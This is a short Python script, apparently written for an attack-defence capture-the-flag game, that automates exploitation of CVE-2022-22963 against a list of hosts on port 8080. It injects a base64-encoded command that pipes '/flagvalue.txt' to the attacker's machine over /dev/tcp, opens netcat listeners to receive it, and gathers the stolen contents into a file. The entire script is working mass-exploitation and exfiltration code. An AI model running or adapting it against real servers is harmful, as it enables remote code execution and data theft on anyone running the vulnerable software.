import socket
import os
import random
import base64

f=open("alive.txt",'r').readlines()
lhost = "192.168.253.129"


payload_bak = open("payload_cve-2022-22963", 'r').read()
for i in f:
    ip = i.strip("\r\n")
    port = 8080
    lport = random.randint(1000, 65535)
    command = "cat /flagvalue.txt > /dev/tcp/%s/%s"%(lhost,lport)   
    command_base64 = base64.b64encode(command.encode())
    payload = payload_bak.replace("PAYLOAD",command_base64.decode())

    s=socket.socket()
    
    try:
        os.popen("nc -lvp %s > flag/%s &"%(lport, ip))
        s.connect((ip, port))
        s.send(payload.encode())
    except:
        continue

f=open("flag_contect.txt","a")
for p in os.listdir("flag/"):
    if(os.path.getsize("flag/"+p) != 0):
        data = p+":"+open("flag/"+p,"r").read()
        f.write(data)
f.close()
